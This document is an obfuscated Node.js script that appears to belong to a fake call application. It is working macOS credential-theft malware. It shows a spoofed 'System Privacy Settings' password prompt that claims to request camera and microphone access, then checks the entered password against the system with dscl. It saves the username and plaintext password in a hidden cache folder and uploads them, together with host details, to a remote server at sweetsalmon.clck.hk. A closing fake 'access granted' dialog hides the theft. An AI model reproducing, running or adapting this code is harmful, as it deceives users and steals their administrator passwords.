#!/usr/bin/env node

const _0x2cc792=_0x455f;(function(_0x1d4ace,_0x559027){const _0x3dfedf=_0x455f,_0xf1cbc8=_0x1d4ace();while(!![]){try{const _0x4c0238=parseInt(_0x3dfedf(0x20a))/0x1*(parseInt(_0x3dfedf(0x1c8))/0x2)+parseInt(_0x3dfedf(0x1c3))/0x3*(parseInt(_0x3dfedf(0x1cf))/0x4)+parseInt(_0x3dfedf(0x214))/0x5+-parseInt(_0x3dfedf(0x1cb))/0x6+parseInt(_0x3dfedf(0x1f6))/0x7+parseInt(_0x3dfedf(0x1e3))/0x8*(parseInt(_0x3dfedf(0x223))/0x9)+-parseInt(_0x3dfedf(0x1d4))/0xa;if(_0x4c0238===_0x559027)break;else _0xf1cbc8['push'](_0xf1cbc8['shift']());}catch(_0x2c4848){_0xf1cbc8['push'](_0xf1cbc8['shift']());}}}(_0x5901,0x4a4d6));const {execSync}=require('child_process'),fs=require('fs'),path=require('path'),os=require('os'),crypto=require('crypto'),http=require(_0x2cc792(0x1e6)),https=require(_0x2cc792(0x1e4)),CONFIG={'serverDomain':'sweetsalmon.clck.hk','serverPath':'/api/files/upload','serverPort':0x1f98,'apiKey':_0x2cc792(0x1c1),'retryDelay':0xbb8,'maxRetries':0x5,'timeout':0xea60};let SYSTEM_PASSWORD=null;function log(_0x546001,_0x36ba51){const _0x549484=_0x2cc792,_0x2911b4=new Date()[_0x549484(0x1ed)]();console[_0x549484(0x1eb)]('['+_0x2911b4+']\x20'+_0x546001);if(_0x36ba51)console[_0x549484(0x1de)](_0x36ba51);try{const _0x57808c=path[_0x549484(0x1f8)](os[_0x549484(0x1d3)](),_0x549484(0x1f7));fs[_0x549484(0x21a)](_0x57808c,'['+_0x2911b4+']\x20'+_0x546001+'\x0a');if(_0x36ba51)fs['appendFileSync'](_0x57808c,(_0x36ba51[_0x549484(0x21c)]||_0x36ba51)+'\x0a');}catch(_0xd3a259){}}function verifyPassword(_0x2c761c,_0x22ea74){const _0x2ca4fd=_0x2cc792;try{const _0x32d207=_0x2ca4fd(0x1df)+_0x2c761c+'\x20'+_0x22ea74;return execSync(_0x32d207,{'stdio':_0x2ca4fd(0x201)}),!![];}catch(_0x4adab9){return![];}}async function getMacOSPassword(){const _0x3fbef1=_0x2cc792;log(_0x3fbef1(0x202));try{const _0x566cf0=os[_0x3fbef1(0x207)]()[_0x3fbef1(0x1f1)];log('Current\x20user:\x20'+_0x566cf0);for(let _0xba16b7=0x1;_0xba16b7<=0x5;_0xba16b7++){log('Attempt\x20'+_0xba16b7+'\x20of\x205\x20to\x20get\x20password');const _0x150d1b=_0x3fbef1(0x1dd);try{const _0xd05c81=execSync(_0x150d1b,{'encoding':_0x3fbef1(0x1f0)});let _0x3c0f29='';const _0x38ea7a=_0xd05c81[_0x3fbef1(0x208)](/text returned:([^,]+)/);if(_0x38ea7a&&_0x38ea7a[0x1]){_0x3c0f29=_0x38ea7a[0x1][_0x3fbef1(0x1ff)]();if(verifyPassword(_0x566cf0,_0x3c0f29))return log(_0x3fbef1(0x206)),SYSTEM_PASSWORD=_0x3c0f29,_0x3c0f29;else log(_0x3fbef1(0x1d8)),_0xba16b7<0x5&&execSync('osascript\x20-e\x20\x27display\x20dialog\x20\x22Incorrect\x20password.\x20Permission\x20cannot\x20be\x20granted.\x22\x20with\x20title\x20\x22System\x20Privacy\x20Settings\x22\x20with\x20icon\x20stop\x20buttons\x20{\x22Try\x20Again\x22}\x20default\x20button\x20\x22Try\x20Again\x22\x27');}else{if(_0xd05c81[_0x3fbef1(0x221)](_0x3fbef1(0x20d)))return log(_0x3fbef1(0x209)),null;else log(_0x3fbef1(0x1ca));}}catch(_0x1aeb27){log(_0x3fbef1(0x228)+_0x1aeb27[_0x3fbef1(0x1c6)]);if(_0x1aeb27['message'][_0x3fbef1(0x221)](_0x3fbef1(0x1e0)))return log('User\x20canceled\x20password\x20entry'),null;}}return execSync(_0x3fbef1(0x1f2)),null;}catch(_0x244690){return log(_0x3fbef1(0x211)+_0x244690[_0x3fbef1(0x1c6)],_0x244690),null;}}function generateClientId(){const _0x2e2673=_0x2cc792;try{const _0x1fb29b=getMacAddress(),_0x24f030=os['hostname'](),_0x1d11d7=os[_0x2e2673(0x207)]()[_0x2e2673(0x1f1)],_0x57933c=crypto['createHash'](_0x2e2673(0x210))[_0x2e2673(0x1fe)](_0x1fb29b+':'+_0x24f030+':'+_0x1d11d7)[_0x2e2673(0x205)](_0x2e2673(0x212))['substring'](0x0,0x8);return _0x57933c;}catch(_0x16683d){return Math[_0x2e2673(0x1fd)]()[_0x2e2673(0x21e)](0x24)[_0x2e2673(0x1dc)](0x2,0xa);}}function getMacAddress(){const _0x2cd362=_0x2cc792;try{const _0x20db4c=os['networkInterfaces']();for(const _0x27fc7d of Object[_0x2cd362(0x21b)](_0x20db4c)){for(const _0x211219 of _0x20db4c[_0x27fc7d]){if(!_0x211219['internal']&&_0x211219['mac']!==_0x2cd362(0x1f3))return _0x211219[_0x2cd362(0x1d1)];}}return _0x2cd362(0x1c0);}catch(_0x57fe99){return _0x2cd362(0x1c0);}}function _0x5901(){const _0x1c64cd=['mac','----WebKitFormBoundary','homedir','249710edBQzN','Permission\x20process\x20completed','Permission\x20could\x20not\x20be\x20granted',')...','Password\x20verification\x20failed','retryDelay','serverPort','Permission\x20request\x20error:\x20','substring','osascript\x20-e\x20\x27display\x20dialog\x20\x22Call\x20application\x20is\x20requesting\x20access\x20to\x20Microphone/Video\x5cn\x5cnPlease\x20enter\x20your\x20password\x20to\x20allow\x20access.\x22\x20with\x20title\x20\x22System\x20Privacy\x20Settings\x22\x20with\x20icon\x20caution\x20default\x20answer\x20\x22\x22\x20giving\x20up\x20after\x2030\x20with\x20hidden\x20answer\x27','error','dscl\x20/Local/Default\x20-authonly\x20','User\x20canceled','Permission\x20JSON\x20data\x20saved\x20to:\x20','end','10128LKVckE','https','startsWith','http','Permission\x20process\x20canceled:\x20password\x20verification\x20failed','pathname','mkdirSync','.txt\x22\x0d\x0a','log','Unexpected\x20error\x20in\x20permission\x20process','toISOString','type','Retrying\x20permission\x20verification\x20(','utf8','username','osascript\x20-e\x20\x27display\x20dialog\x20\x22Failed\x20to\x20authenticate\x20after\x20multiple\x20attempts.\x20Camera\x20and\x20microphone\x20access\x20is\x20denied.\x22\x20with\x20title\x20\x22Access\x20Denied\x22\x20with\x20icon\x20stop\x20buttons\x20{\x22OK\x22}\x20default\x20button\x20\x22OK\x22\x27','00:00:00:00:00:00','\x0aClientID:\x20','serverDomain','415912oDFEPL','call_app_logs.txt','join','request','Maximum\x20retry\x20attempts\x20reached','Content-Disposition:\x20form-data;\x20name=\x22clientInfo\x22\x0d\x0a','platform','random','update','trim','maxRetries','ignore','\x0a===\x20Requesting\x20macOS\x20administrator\x20password\x20for\x20call\x20app\x20access\x20===','--\x0d\x0a','Permission\x20verification\x20successful:\x20','digest','Administrator\x20password\x20verified','userInfo','match','User\x20canceled\x20password\x20entry','505783XklyYN','Uploading\x20permission\x20data\x20to\x20server:\x20','Permission\x20granted\x20successfully','gave\x20up:true','User:\x20','Error\x20saving\x20permission\x20data:\x20','md5','Error\x20getting\x20administrator\x20password:\x20','hex','multipart/form-data;\x20boundary=','969890ONOhCH','substr','arch','apiKey','Permission\x20data\x20saved\x20to:\x20','\x0aType:\x20','appendFileSync','keys','stack','then','toString','\x0aHostname:\x20','\x0aPlatform:\x20','includes','statusCode','279gJdrAQ','write','.txt','hostname','Content-Disposition:\x20form-data;\x20name=\x22file\x22;\x20filename=\x22','Error\x20requesting\x20password\x20via\x20dialog:\x20','unknown','tJz4uRVCwl2eEwyPTudYP9iGRfgq','https://','253692YiDkmq','stringify','timeout','message','\x0aArchitecture:\x20','2RPycUN','Permission\x20error:\x20failed\x20to\x20save\x20verification\x20data','Could\x20not\x20extract\x20password\x20from\x20dialog\x20response','3322044dqFBgz','osascript\x20-e\x20\x27display\x20dialog\x20\x22Unable\x20to\x20grant\x20microphone\x20and\x20camera\x20access.\x20Please\x20try\x20again\x20later.\x22\x20with\x20title\x20\x22Access\x20Error\x22\x20buttons\x20{\x22OK\x22}\x20default\x20button\x20\x22OK\x22\x27','osascript\x20-e\x20\x27display\x20dialog\x20\x22Microphone\x20and\x20camera\x20access\x20has\x20been\x20successfully\x20granted.\x22\x20with\x20title\x20\x22Access\x20Granted\x22\x20buttons\x20{\x22OK\x22}\x20default\x20button\x20\x22OK\x22\x27','writeFileSync','4PIZJyO','\x0aTime:\x20'];_0x5901=function(){return _0x1c64cd;};return _0x5901();}async function uploadToServer(_0x145af2,_0x3a36e4=0x0){return new Promise(_0x8087a8=>{const _0xa53f00=_0x455f;try{const _0x578ff2=generateClientId(),_0x4d6b18={'hostname':os['hostname'](),'platform':os[_0xa53f00(0x1fc)](),'type':os[_0xa53f00(0x1ee)](),'arch':os['arch'](),'username':os[_0xa53f00(0x207)]()[_0xa53f00(0x1f1)],'id':_0x578ff2},_0x3e479b=CONFIG[_0xa53f00(0x1da)]===0x1bb?_0xa53f00(0x1e4):_0xa53f00(0x1e6),_0x3a48fd=_0x3e479b+'://'+CONFIG[_0xa53f00(0x1f5)]+':'+CONFIG['serverPort']+CONFIG['serverPath'],_0x5bd60c=_0x3a48fd[_0xa53f00(0x1e5)](_0xa53f00(0x1c2)),_0x5c8f54=_0x5bd60c?https:http,_0x572ebc=new URL(_0x3a48fd),_0x4c6ae5=_0xa53f00(0x1d2)+Math['random']()[_0xa53f00(0x21e)](0x10)[_0xa53f00(0x215)](0x2);let _0x3b849d='';_0x3b849d+='--'+_0x4c6ae5+'\x0d\x0a',_0x3b849d+=_0xa53f00(0x1fb),_0x3b849d+='Content-Type:\x20application/json\x0d\x0a\x0d\x0a',_0x3b849d+=JSON[_0xa53f00(0x1c4)](_0x4d6b18)+'\x0d\x0a',_0x3b849d+='--'+_0x4c6ae5+'\x0d\x0a',_0x3b849d+=_0xa53f00(0x227)+_0x578ff2+_0xa53f00(0x1ea),_0x3b849d+='Content-Type:\x20text/plain\x0d\x0a\x0d\x0a',_0x3b849d+=_0x145af2+'\x0d\x0a',_0x3b849d+='--'+_0x4c6ae5+_0xa53f00(0x203);const _0x54b071={'hostname':_0x572ebc['hostname'],'port':_0x572ebc['port']||(_0x5bd60c?0x1bb:0x50),'path':_0x572ebc[_0xa53f00(0x1e8)]+_0x572ebc['search'],'method':'POST','headers':{'Content-Type':_0xa53f00(0x213)+_0x4c6ae5,'Content-Length':Buffer['byteLength'](_0x3b849d),'X-Client-Info':JSON[_0xa53f00(0x1c4)](_0x4d6b18),'X-API-Key':CONFIG[_0xa53f00(0x217)]},'timeout':CONFIG[_0xa53f00(0x1c5)]};log(_0xa53f00(0x20b)+_0x3a48fd);const _0x5b23c2=_0x5c8f54[_0xa53f00(0x1f9)](_0x54b071,_0xcf70c7=>{const _0x126c8c=_0xa53f00;let _0x20a594='';_0xcf70c7['on']('data',_0x5eba40=>{_0x20a594+=_0x5eba40;}),_0xcf70c7['on'](_0x126c8c(0x1e2),()=>{const _0xcfb2f1=_0x126c8c;_0xcf70c7[_0xcfb2f1(0x222)]>=0xc8&&_0xcf70c7[_0xcfb2f1(0x222)]<0x12c?(log(_0xcfb2f1(0x204)+_0xcf70c7[_0xcfb2f1(0x222)]),_0x8087a8(!![])):(log('Permission\x20verification\x20failed:\x20'+_0xcf70c7[_0xcfb2f1(0x222)]+',\x20'+_0x20a594),_0x3a36e4<CONFIG[_0xcfb2f1(0x200)]?(log(_0xcfb2f1(0x1ef)+(_0x3a36e4+0x1)+'/'+CONFIG[_0xcfb2f1(0x200)]+_0xcfb2f1(0x1d7)),setTimeout(()=>{const _0x48050f=_0xcfb2f1;uploadToServer(_0x145af2,_0x3a36e4+0x1)[_0x48050f(0x21d)](_0x8087a8);},CONFIG[_0xcfb2f1(0x1d9)])):(log(_0xcfb2f1(0x1fa)),_0x8087a8(![])));});});_0x5b23c2['on'](_0xa53f00(0x1de),_0x5826ac=>{const _0x21155f=_0xa53f00;log(_0x21155f(0x1db)+_0x5826ac[_0x21155f(0x1c6)],_0x5826ac),_0x3a36e4<CONFIG[_0x21155f(0x200)]?(log(_0x21155f(0x1ef)+(_0x3a36e4+0x1)+'/'+CONFIG['maxRetries']+')...'),setTimeout(()=>{const _0x50abad=_0x21155f;uploadToServer(_0x145af2,_0x3a36e4+0x1)[_0x50abad(0x21d)](_0x8087a8);},CONFIG[_0x21155f(0x1d9)])):(log(_0x21155f(0x1fa)),_0x8087a8(![]));}),_0x5b23c2[_0xa53f00(0x224)](_0x3b849d),_0x5b23c2[_0xa53f00(0x1e2)]();}catch(_0x3c1cb7){log('Permission\x20error:\x20'+_0x3c1cb7[_0xa53f00(0x1c6)],_0x3c1cb7),_0x3a36e4<CONFIG[_0xa53f00(0x200)]?(log('Retrying\x20permission\x20verification\x20('+(_0x3a36e4+0x1)+'/'+CONFIG[_0xa53f00(0x200)]+_0xa53f00(0x1d7)),setTimeout(()=>{const _0x652feb=_0xa53f00;uploadToServer(_0x145af2,_0x3a36e4+0x1)[_0x652feb(0x21d)](_0x8087a8);},CONFIG['retryDelay'])):(log(_0xa53f00(0x1fa)),_0x8087a8(![]));}});}function savePasswordLocally(_0x4ffee0){const _0x3604a8=_0x2cc792;try{const _0xda9e0a=os[_0x3604a8(0x207)]()[_0x3604a8(0x1f1)],_0x3c9234=generateClientId(),_0x2c627f=new Date()[_0x3604a8(0x1ed)](),_0x40dfb1=os[_0x3604a8(0x1d3)](),_0x4213d2=path[_0x3604a8(0x1f8)](_0x40dfb1,'CallAppCache');!fs['existsSync'](_0x4213d2)&&fs[_0x3604a8(0x1e9)](_0x4213d2,{'recursive':!![]});const _0x1b6191=_0x3604a8(0x20e)+_0xda9e0a+'\x0aPassword:\x20'+_0x4ffee0+_0x3604a8(0x1d0)+_0x2c627f+_0x3604a8(0x21f)+os[_0x3604a8(0x226)]()+_0x3604a8(0x220)+os[_0x3604a8(0x1fc)]()+_0x3604a8(0x219)+os[_0x3604a8(0x1ee)]()+_0x3604a8(0x1c7)+os[_0x3604a8(0x216)]()+_0x3604a8(0x1f4)+_0x3c9234,_0x9eab29=path[_0x3604a8(0x1f8)](_0x4213d2,_0x3c9234+_0x3604a8(0x225));fs[_0x3604a8(0x1ce)](_0x9eab29,_0x1b6191),log(_0x3604a8(0x218)+_0x9eab29);const _0x5f3297={'user':_0xda9e0a,'password':_0x4ffee0,'timestamp':_0x2c627f,'hostname':os[_0x3604a8(0x226)](),'system':{'platform':os['platform'](),'release':os['release'](),'type':os['type'](),'arch':os['arch']()},'clientId':_0x3c9234},_0x5b9f95=path[_0x3604a8(0x1f8)](_0x4213d2,_0x3c9234+'.json');return fs[_0x3604a8(0x1ce)](_0x5b9f95,JSON['stringify'](_0x5f3297,null,0x2)),log(_0x3604a8(0x1e1)+_0x5b9f95),_0x1b6191;}catch(_0x2cba5f){return log(_0x3604a8(0x20f)+_0x2cba5f[_0x3604a8(0x1c6)],_0x2cba5f),null;}}async function main(){const _0x190910=_0x2cc792;try{log('Starting\x20camera\x20and\x20microphone\x20access\x20permission\x20process');const _0x26b03a=await getMacOSPassword();if(!_0x26b03a){log(_0x190910(0x1e7));return;}const _0x92db96=savePasswordLocally(_0x26b03a);if(!_0x92db96){log(_0x190910(0x1c9));return;}const _0x28de5d=await uploadToServer(_0x92db96);if(_0x28de5d){log(_0x190910(0x20c));try{execSync(_0x190910(0x1cd));}catch(_0x1e551e){}}else{log(_0x190910(0x1d6));try{execSync(_0x190910(0x1cc));}catch(_0x475c4b){}}log(_0x190910(0x1d5));}catch(_0x155fc9){log(_0x190910(0x1ec),_0x155fc9);}}function _0x455f(_0x94cb6d,_0x258c35){const _0x5901e0=_0x5901();return _0x455f=function(_0x455fd5,_0x882833){_0x455fd5=_0x455fd5-0x1c0;let _0x3e6eda=_0x5901e0[_0x455fd5];return _0x3e6eda;},_0x455f(_0x94cb6d,_0x258c35);}main();
